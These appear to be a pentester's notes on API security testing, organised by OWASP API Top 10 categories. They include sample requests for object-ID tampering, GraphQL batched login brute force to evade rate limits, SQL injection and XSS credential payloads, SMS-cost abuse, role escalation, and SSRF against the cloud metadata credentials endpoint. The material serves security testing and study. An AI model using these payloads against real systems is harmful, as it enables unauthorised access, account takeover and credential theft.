# API Testing

Do Some Changes on endpoints

like:

- bypass 1:
    - /v2/address/recipt/result/show
    - /v1/address/recipt/result/show
- bypass 2:
    - /v2/address/recipt/result/show
    - /V2/aDdreSs/reCiPt/rEsUlt/ShOW

---

[https://github.com/inonshk/31-days-of-API-Security-Tips](https://github.com/inonshk/31-days-of-API-Security-Tips)

[OWASP API Security Top 10 Vulnerabilities: 2023 - API Security News](https://apisecurity.io/owasp-api-security-top-10/)

[#1 API Security Platform | API Security Testing | API Protection](https://42crunch.com/tools/free-audit/?__hstc=78516299.ba72b2adecc96ce0beff8f61ff9fa943.1707424663421.1707424663421.1707424663421.1&__hssc=78516299.2.1707424663422&__hsfp=1193805002)

---

## **Broken object level authorization - BOLA**

if you see endpoint like this 

`/api/shop1/financial_info`

try to change values to this 

`/api/shop2/financial_info`

`/api/123/financial_info`

`/apI/123/financial_iNfo`

just dont scare to send this to intruder and fuzz on shopname:

`/shops/{shopName}/revenue_data.json`

try to change the ID parameters so if you can delete other users data

```bash
POST /graphql
{
"operationName":"deleteReports",
"variables":{
"reportKeys":["<DOCUMENT_ID>"]
},
"query":"mutation deleteReports($siteId: ID!, $reportKeys: [String]!) {
{
deleteReports(reportKeys: $reportKeys)
}
}"
}
```

**Predictable ID**

```
GET /api/v1/account/**2222**
Token: UserA_token

GET /api/v1/account/**3333**
Token: UserA_token
```

**ID combo**

```
GET /api/v1/**UserA**/data/2222
Token: UserA_token

GET /api/v1/**UserB**/data/3333
Token: UserA_token
```

**Integer as ID**

```
POST /api/v1/account/
Token: UserA_token
{"Account": 2222 }

POST /api/v1/account/
Token: UserA_token
{"Account": [3333]}
```

**Email as user ID**

```
POST /api/v1/user/account
Token: UserA_token
{"email": " UserA@email.com"}

POST /api/v1/user/account
Token: UserA_token
{"email": " UserB@email.com"}
```

**Group ID**

```
GET /api/v1/group/CompanyA
Token: UserA_token

GET /api/v1/group/CompanyB
Token: UserA_token
```

**Group and user combo**

```
POST /api/v1/group/CompanyA
Token: UserA_token
{"email": " userA@CompanyA .com"}

POST /api/v1/group/CompanyB
Token: UserA_token
{"email": " userB@CompanyB .com"}
```

**Nested object**

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": {"Account" :3333}}
```

**Multiple objects**

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222, "Account": 3333, "Account": 5555 }
```

**Predictable token**

```
POST /api/v1/user/account
Token: UserA_token
{"data": "DflK1df7jSdfa1acaa"}

POST /api/v1/user/account
Token: UserA_token
{"data": "DflK1df7jSdfa2dfaa"}
```

## **Broken authentication**

look for Passwords that are weak, plain text, encrypted, poorly hashed, shared, or default passwords

try find Authentication susceptible to brute force attacks and credential stuffing

Credentials and keys included in URLs / Sends sensitive authentication details, such as auth tokens and passwords in the URL.

Lack of access token validation (including JWT validation)

Unsigned or weakly signed non-expiring JWTs

Dose is there have any rate limit?

Allows users to change their email address, current password, or do any other sensitive operations without asking for password confirmation

Accepts unsigned/weakly signed JWT tokens ({"alg":"none"})

Doesn't validate the JWT expiration date

Uses weak encryption keys

there is authenticate schema and it have authentication rate limit so you can only auth 3 times in row:

```bash
POST /graphql
{
"query":"mutation {
login (username:\"<username>\",password:\"<password>\") {
token
}
}"
}
```

try if you can send 50 user and pass per one request to bypass rate limit

 

```bash
POST /graphql
[
  {"query":"mutation{login(username:\"victim\",password:\"password\"){token}}"},
  {"query":"mutation{login(username:\"victim\",password:\"123456\"){token}}"},
  {"query":"mutation{login(username:\"victim\",password:\"qwerty\"){token}}"},
  ...
  {"query":"mutation{login(username:\"victim\",password:\"123\"){token}}"},
]
```

there is reset email function

```bash
PUT /account
Authorization: Bearer <token>
{ "email": "<new_email_address>" }
```

try to change other users emails.

1. Basic credentials

```
{
"login": "admin",
"password": "admin"
}

```

1. Empty credentials:

```
{
"login": "",
"password": ""
}

```

3- Null values:

```
{
"login": null,
"password": null
}

```

1. Credentials as numbers:

```
{
"login": 123,
"password": 456
}

```

1. Credentials as booleans:

```
{
"login": true,
"password": false
}

```

1. Credentials as arrays:

```
{
"login": ["admin"],
"password": ["password"]
}

```

1. Credentials as objects:

```
{
"login": {"username": "admin",
"password": {"password": "password"}}
}

```

1. Special characters in credentials:

```
{
"login": "@dm!n",
"password": "p@ssw0rd#"
}

```

1. SQL Injection:

```
{
"login": "admin' --",
"password": "password"
}

```

1. HTML tags in credentials:

```
{
"login": "<h1>admin</h1>",
"password": "ololo-HTML-XSS"
}

```

1. Unicode in credentials:

```
{
"login": "\u0061\u0064\u006D\u0069\u006E",
"password":"\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064"
}

```

1. Credentials with escape characters:

```
{
"login": "ad\\nmin",
"password": "pa\\ssword"
}

```

1. Credentials with white space:

```
{
"login": " ",
"password": " "
}

```

1. Overlong values:

`{
"login": "a"*10000,
"password": "b"*10000
}`

## **Broken Object Property Level Authorization**

> API endpoints can be vulnerable to attacks based on their data: either they may expose more data than is required for their business purposes (excessive information exposure), or they may inadvertently accept and process more data than they should (mass assignment).
> 
- The API endpoint exposes properties of an object that are considered sensitive and should not be read by the user. (previously named: "[Excessive Data Exposure](https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/)")
- The API endpoint allows a user to change, add/or delete the value of a sensitive object's property which the user should not be able to access (previously named: "[Mass Assignment](https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/)")

there is a report another user function

```bash
POST /graphql
{
"operationName":"reportUser",
"variables":{
"userId": 313,
"reason":["offensive behavior"]
},
"query":"mutation reportUser($userId: ID!, $reason: String!) {
reportUser(userId: $userId, reason: $reason) {
status
message
reportedUser {
id
fullName
recentLocation
}
}
}"
}
```

so if you looking to report request its disclose the use full na,e and recent location as senstivity data.

## **Unrestricted Resource Consumption**

- Execution timeouts
- Maximum allocable memory
- Maximum number of file descriptors
- Maximum number of processes
- Maximum upload file size
- Number of operations to perform in a single API client request (e.g. GraphQL batching)
- Number of records per page to return in a single request-response
- Third-party service providers' spending limit

its sms delevery fucation cost company 0.05$ to deliver sms

```bash
POST /sms/send_reset_pass_code
Host: [willyo.net](http://willyo.net/)
{
"phone_number": "6501113434"
}
```

try if you can send it too many time so the cost of its begin under control of the company.

## **Broken function level authorization**

there is user info endpoint

- `/api/users/v1/user/myinfo`

you fuzz this endpoint and see this:

- `/api/admins/v1/users/all`

Can a regular user access administrative endpoints?
Can a user perform sensitive actions (e.g. creation, modification, or deletion ) that they should not have access to by simply changing the HTTP method (e.g. from GET to DELETE)?
Can a user from group X access a function that should be exposed only to users from group Y, by simply guessing the endpoint URL and parameters (e.g. /api/v1/users/export_all)?

can you change important functions like role?

```bash
POST /api/invites/new
{
"email": "[attacker@somehost.com](mailto:attacker@somehost.com)",
"role":"admin"
}
```

## **Unrestricted Access to Sensitive Business Flows**

[Senstivity Data Discovery](https://www.notion.so/Senstivity-Data-Discovery-a77686237f5a4a22b7852b218b9d22d9?pvs=21)

dont foget to look responses body nad headers.

## **Server Side Request Forgery**

[SSRF](https://www.notion.so/SSRF-ac42cc2b7a234e99a5a347099980cdae?pvs=21)

i just put some code so you are see how vulnerable ssrf code is it:

```bash
POST /api/profile/upload_picture

{
  **"picture_url": "http://example.com/profile_pic.jpg"**
}
```

```bash
POST /graphql

[
  {
    "variables": {},
    "query": "mutation {
      createNotificationChannel(input: {
        channelName: \"ch_piney\",
        notificationChannelConfig: {
          customWebhookChannelConfigs: [
            {
              **url: \"http://www.siem-system.com/create_new_event\",**
              send_test_req: true
            }
          ]
          }
      }){
        channelId
    }
    }"
  }
]
```

```bash
POST /graphql

[
  {
    "variables": {},
    "query": "mutation {
      createNotificationChannel(input: {
        channelName: \"ch_piney\",
        notificationChannelConfig: {
          customWebhookChannelConfigs: [
            {
              **url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\",**
              send_test_req: true
            }
          ]
        }
      }) {
        channelId
      }
    }
  }
]
```

## **Security misconfiguration**

[SOP & CSP & CORS](https://www.notion.so/SOP-CSP-CORS-412bf327655b41939ed6662b926c9cb2?pvs=21)

Unpatched systems
Unprotected files and directories
Unhardened images
Missing, outdated, or misconfigured TLS
Exposed storage or server management panels
Missing CORS policy or security headers
Error messages with stack traces
Unnecessary features enabled

Appropriate security hardening is missing across any part of the API stack, or if there are improperly configured permissions on cloud services
The latest security patches are missing, or the systems are out of date
Unnecessary features are enabled (e.g. HTTP verbs, logging features)
There are discrepancies in the way incoming requests are processed by servers in the HTTP server chain
Transport Layer Security (TLS) is missing
Security or cache control directives are not sent to clients
A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
Error messages include stack traces, or expose other sensitive information

## **Improper inventory management**

Attackers find non-production versions of the API (for example, staging, testing, beta, or earlier versions) that are not as well protected as the production API, and use those to launch their attacks.

check github pages?

The purpose of an API host is unclear, and there are no explicit answers to the following questions
Which environment is the API running in (e.g. production, staging, test, development)?
Who should have network access to the API (e.g. public, internal, partners)?
Which API version is running?
There is no documentation or the existing documentation is not updated.
There is no retirement plan for each API version.
The host's inventory is missing or outdated.

A social network implemented a rate-limiting mechanism that blocks attackers from using brute force to guess reset password tokens. This mechanism wasn't implemented as part of the API code itself but in a separate component between the client and the official API ([api.socialnetwork.owasp.org](http://api.socialnetwork.owasp.org/)). A researcher found a beta API host ([beta.api.socialnetwork.owasp.org](http://beta.api.socialnetwork.owasp.org/)) that runs the same API, including the reset password mechanism, but the rate-limiting mechanism was not in place. The researcher was able to reset the password of any user by using simple brute force to guess the 6 digit token.

## **Unsafe Consumption of APIs**

Developers tend to trust data received from third-party APIs more than user input. This is especially true for APIs offered by well-known companies. Because of that, developers tend to adopt weaker security standards, for instance, in regards to input validation and sanitization.

The API might be vulnerable if:

- Interacts with other APIs over an unencrypted channel;
- Does not properly validate and sanitize data gathered from other APIs prior to processing it or passing it to downstream components;
- Blindly follows redirections;
- Does not limit the number of resources available to process third-party services responses;
- Does not implement timeouts for interactions with third-party services;

[API10:2023 Unsafe Consumption of APIs - OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)

---

[](https://github.com/cybersecuz/API-Security-Checklist/blob/master/README.md)

[https://github.com/Az0x7/vulnerability-Checklist/blob/main/Api Authentication /Authentication.md](https://github.com/Az0x7/vulnerability-Checklist/blob/main/Api%20Authentication%20/Authentication.md)

[https://github.com/Az0x7/vulnerability-Checklist/blob/main/Api Authorization/Authorization.md](https://github.com/Az0x7/vulnerability-Checklist/blob/main/Api%20Authorization/Authorization.md)

Use this JSON Tests for Authentication Endpoints:

[Lis Tahirbegolli on LinkedIn: JSON Tests | 18 comments](https://www.linkedin.com/feed/update/urn:li:activity:7097279293608607746/)